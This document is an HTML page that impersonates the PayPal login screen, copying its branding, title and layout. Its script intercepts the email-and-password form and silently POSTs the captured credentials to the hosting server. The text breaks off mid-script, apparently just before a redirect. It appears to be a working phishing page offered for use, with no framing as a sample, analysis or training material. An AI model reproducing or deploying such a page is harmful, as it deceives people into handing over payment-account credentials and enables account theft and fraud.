<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Log in to your PayPal account</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:'PayPalOpen','Helvetica Neue',Arial,sans-serif}.header{background:#0070ba;padding:20px;text-align:center}.header img{height:40px}.container{display:flex;justify-content:center;align-items:center;min-height:80vh;background:#f7f9fa}.box{background:white;border-radius:8px;padding:40px;width:400px;box-shadow:0 2px 12px rgba(0,0,0,.1)}.title{font-size:24px;font-weight:400;color:#2c2e2f;margin-bottom:24px}input{width:100%;padding:14px;border:1px solid #9da3a6;border-radius:4px;font-size:16px;margin-bottom:16px;outline:none}input:focus{border-color:#0070ba;box-shadow:0 0 0 3px rgba(0,112,186,.2)}input[type="submit"]{background:#0070ba;color:white;border:none;font-weight:700;cursor:pointer;border-radius:25px}input[type="submit"]:hover{background:#005ea6}.link{text-align:center;margin-top:20px}.link a{color:#0070ba;text-decoration:none;font-size:14px}.link a:hover{text-decoration:underline}</style></head><body><div class="header"><img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 124 33'><path fill='white' d='M13.5 11.5h3.5l-2.2 14H11l2.5-14zm8.5 0h3.3l-2.2 14h-3.3l2.2-14zm8.5 0h3.2l-1.5 9.5L36 25.5h-3.5l-1-6-2 6h-3.5l4.5-14zM7 6.5L1.5 25.5h4L8 20h4.5l.5-3H9l1-6.5H7z'/></svg>"alt="PayPal"></div><div class="container"><div class="box"><div class="title">Log in to PayPal</div><form method="POST"><input type="email"name="email"placeholder="Email address"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><div class="link"><a href="#">Having trouble logging in?</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.
